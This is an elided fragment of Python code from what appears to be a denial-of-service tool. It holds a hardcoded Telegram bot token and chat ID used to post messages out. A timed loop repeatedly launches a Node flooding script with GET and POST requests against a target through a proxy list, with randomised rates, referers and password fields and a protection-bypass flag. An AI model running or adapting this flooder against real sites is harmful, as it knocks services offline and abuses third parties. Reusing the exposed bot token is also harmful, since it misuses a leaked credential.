...
BOT_TOKEN = "7865904723:AAHXO9ojpEHm3WxtbIBJIPPlQYoRKeZJ0W4"
CHAT_ID = "7354767620"
...
def send_to_telegram(message):
    ...
    try:
        th.Thread(target=re.post, args=(url,), kwargs={"data": payload}).start()
...
"""
                ...
                try:
                    ...
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f'node bin/odd/.cache/TOR.js GET "{tg}" 120 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f'node bin/odd/.cache/TOR.js POST "{tg}" 120 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                        )
                        t.sleep(1)
                except IndexError:
